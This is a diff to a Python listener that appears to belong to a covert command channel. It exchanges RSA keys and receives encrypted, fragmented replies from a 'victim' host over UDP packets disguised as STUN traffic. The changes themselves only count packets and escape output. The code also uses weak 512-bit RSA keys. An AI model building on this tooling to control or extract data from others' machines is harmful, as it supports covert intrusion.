@@ -1,4 +1,4 @@
-import rsa, socket, random, time, sys, threading, argparse, base64, struct
+import rsa, socket, random, time, sys, threading, argparse, base64, struct, html
 from decryption import decrypt_message
 from encryption import encrypt_message
 from message_fragmentation import fragment_message
@@ -39,6 +39,7 @@ total_data_size = 0
 target_pub_key = None
 my_pub_key = None
 my_priv_key = None
+transmitted_messages = 0
 
 # Parses a string representation of an RSA public key
 def parse_public_key(text: str) -> rsa.PublicKey:
@@ -73,7 +74,7 @@ def exchange_keys():
 
 # Listens for incoming UDP fragments and handles key exchange or message decryption
 def get_response(port, start_time):
-    global target_pub_key, buffer_size, chunk_size, total_data_size, max_data_allowed, target_ip, my_pub_key, my_priv_key
+    global target_pub_key, buffer_size, chunk_size, total_data_size, max_data_allowed, target_ip, my_pub_key, my_priv_key, transmitted_messages
     ip = "0.0.0.0"
     received_chunks = {}
     excpected_chunks = None
@@ -92,6 +93,7 @@ def get_response(port, start_time):
     try:
         while True:
             data, addr = listen_socket.recvfrom(2048)
+            transmitted_messages += 1
             if len(data) < 20:
                 continue
             header = data[:20]
@@ -132,6 +134,7 @@ def get_response(port, start_time):
                 return
             # Handle key exchange
             if part.startswith("PublicKey("):
+                transmitted_messages += 3
                 target_pub_key = parse_public_key(part)
                 ( my_pub_key, my_priv_key ) = rsa.newkeys(512)
                 listen_socket.sendto(build_stun_message(f"PublicKey({my_pub_key.n}, {my_pub_key.e})".encode('utf8')), (target_ip, target_port))
@@ -153,10 +156,9 @@ def get_response(port, start_time):
                 try:
                     full_response = ''.join(received_chunks[i] for i in sorted(received_chunks))
                     decoded_response = base64.b64decode(full_response)
-                    decypted_message = decrypt_message(decoded_response, my_priv_key)
-
-                    if decypted_message["status"] == 200:
-                        full_response = decypted_message["message"]
+                    decrypted_message = decrypt_message(decoded_response, my_priv_key)
+                    if decrypted_message["status"] == 200:
+                        full_response = html.escape(decrypted_message["message"])
                     else:
                         log_error(f"<ansired>Failed to decrypt a response received from <ansigreen>{victim_ip}:{victim_port}</ansigreen>, decryption key doesn't match</ansired>")
                         return
@@ -165,6 +167,7 @@ def get_response(port, start_time):
                     listen_socket.close()
                     end_time = time.time()
                     latency = end_time - start_time
+                    log_info(f"<ansiyellow>total packets transmitted: {transmitted_messages}</ansiyellow>")
                     log_info(f"<ansiyellow>latency:</ansiyellow> <ansimagenta>{latency:.2f} seconds</ansimagenta>")
                     log_info(f"<ansicyan>stopped listening on</ansicyan> <ansigreen>{ip}</ansigreen><ansicyan>:</ansicyan><ansigreen>{port}</ansigreen><ansicyan>...</ansicyan>")
                     return
